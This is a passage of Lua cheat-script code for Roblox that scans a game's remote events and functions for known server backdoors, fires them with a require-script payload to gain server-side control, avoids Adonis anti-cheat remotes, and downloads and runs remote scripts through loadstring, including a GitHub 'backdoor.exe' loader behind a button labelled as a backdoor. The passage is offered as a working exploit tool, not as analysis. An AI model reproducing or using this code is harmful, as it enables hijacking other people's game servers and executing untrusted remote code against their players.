        while PlayerGui and not PlayerGui:FindFirstChild("tntmasterGui") and (possibleWait > dateTimeNow().UnixTimestampMillis - start) do
            taskWait()
        end
    end
 
    return PlayerGui and PlayerGui:FindFirstChild("tntmasterGui")
end
 
local function validRemote(rm)
    local Parent = rm.Parent
 
    if getgenv().blacklisted then
        if tableFind(getgenv().blacklisted, rm:GetFullName()) then return false end
    end
 
    if Parent then
        if Parent == JointsService then return false end
 
        -- Addonis Check
        if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
            (rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
 
        --      if (Parent.ClassName == "Folder" and Parent.Name == "DefaultChatSystemChatEvents" and Parent.Parent == ReplicatedStorage) then return false end
    end
 
    if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end
 
    return true
end
 
local function harked()
    local backpack = LocalPlayer.Backpack 
    return backpack:FindFirstChild("HandlessSegway") and
        backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
        backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
end
local function emmaBackdoor(rm)
    local Parent = rm.Parent
    return rm.Name == "emma" and Parent and Parent.Name == "mynameemma" and Parent.Parent == ReplicatedStorage
end
 
local function runBackdoor(rm)
    local Parent = rm.Parent
    return rm.Name == "Run" and Parent and
        Parent:FindFirstChild("Pages") and Parent:FindFirstChild("R6") and
        Parent:FindFirstChild("Version") and Parent:FindFirstChild("Title")
end
 
local function httpRequest(url)
    if syn and syn.request then return syn.request({Url=url}).Body
    elseif request then return request({Url=url}).Body
    else return game:HttpGetAsync(url) end
end
 
local function scanGame()
    notify("Scanning for a backdoor.")
 
    if harked() then
        loadstring(httpRequest(alternativeSS.harked))()
        return
    end
 
    do
        local DescendantsList = game:GetDescendants()
        for index=1, #DescendantsList do
            if attached() then break end
            local remote = DescendantsList[index]
 
            if not validRemote(remote) then continue end
            if remote.ClassName ~= "RemoteEvent" then continue end
 
            if emmaBackdoor(remote) then
                remote:FireServer(unpack(alternativeSS.emma), requireScript)
            end
            if not attached() and runBackdoor(remote) then
                remote:FireServer(unpack(alternativeSS.run), requireScript)
            end
 
            if not attached() then remote:FireServer(unpack(alternativeSS.helpme), requireScript) end
            if not attached() then remote:FireServer(unpack(alternativeSS.pickett), requireScript) end
            if not attached() then remote:FireServer(requireScript) end
 
        end
        if attached() then return end
 
        for index=1, #DescendantsList do
            if attached() then break end
            local remote = DescendantsList[index]
 
            if not validRemote(remote) then continue end
            if remote.ClassName ~= "RemoteFunction" then continue end
 
            local waiting = true
            taskSpawn(function()
                remote:InvokeServer(requireScript)
                waiting = nil
            end)
 
            -- If RemoteFunction don't respond in 1 second, we skip this one.
            local start = dateTimeNow().UnixTimestampMillis
            while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
                taskWait()
            end
 
        end
    end
end
 
local function Main()
    notify(("Game Name:\nCode: %s"):format(GameCode))
 
    scanGame()
 
    if not attached(3.5) then
        notify("Unable to find backdoor.\nGame not backdoored?")
    end
end
 
if game:IsLoaded() then
    pcall(Main)
end
end)
bug:Button("后门v6x",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6x/source.lua"))()
end)



